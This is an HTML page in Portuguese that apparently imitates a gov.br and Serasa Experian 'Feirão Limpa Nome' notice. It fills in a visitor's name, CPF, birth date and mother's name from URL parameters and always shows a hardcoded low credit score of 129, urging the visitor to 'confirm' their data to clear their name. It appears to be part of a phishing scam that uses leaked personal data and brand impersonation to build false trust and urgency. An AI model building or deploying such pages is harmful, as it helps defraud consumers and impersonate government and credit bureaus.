<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Demonstrativo de dados vazados</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #fff;
            padding: 15px;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #fff;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #D72A7F;
        }

        .logo {
            height: 45px;
            width: auto;
        }

        .alert {
            font-size: 16px;
            line-height: 1.5;
            color: #333;
            margin-bottom: 25px;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 8px;
            border: 1px solid #eee;
        }

        .info-box {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 12px;
        }

        .info-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }

        .info-value {
            font-size: 16px;
            font-weight: bold;
            color: #333;
        }

        .footer {
            margin-top: 25px;
            padding-top: 20px;
            border-top: 2px solid #D72A7F;
            text-align: center;
        }

        .empresa {
            font-size: 16px;
            color: #666;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <img src="images/AruTTdpf3pY6.png" alt="gov.br" class="logo">
        </div>

        <div class="alert">Revise seus dados abaixo e confirme agora para limpar seu nome e recuperar seu acesso ao crédito no mercado.</div>

        <div class="info-box">
            <div class="info-label">Nome completo:</div>

            <div class="info-value" id="name">Carregando...</div>
        </div>

        <div class="info-box">
            <div class="info-label">CPF:</div>

            <div class="info-value" id="cpf">Carregando...</div>
        </div>

        <div class="info-box">
            <div class="info-label">Data de nascimento:</div>

            <div class="info-value" id="dateOfBirth">Carregando...</div>
        </div>

        <div class="info-box">
            <div class="info-label">Nome da mãe:</div>
            <div class="info-value" id="motherName">Carregando...</div>
        </div>

        <div class="info-box">
            <div class="info-label">Score:</div>

            <div class="info-value" id="score">Carregando...</div>
        </div>

        <div class="footer">
            <p class="empresa">Feirão Limpa Nome - Serasa Experian</p>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);

        document.getElementById('name').textContent = params.get('name') || 'Não informado';

        document.getElementById('cpf').textContent = params.get('cpf') || 'Não informado';

        document.getElementById('dateOfBirth').textContent = params.get('dateOfBirth') || 'Não informado';

        document.getElementById('motherName').textContent = params.get('motherName') || 'Não informado';

        document.getElementById('score').textContent = '129 Pontos - Baixo';
    </script>
</body>

</html>
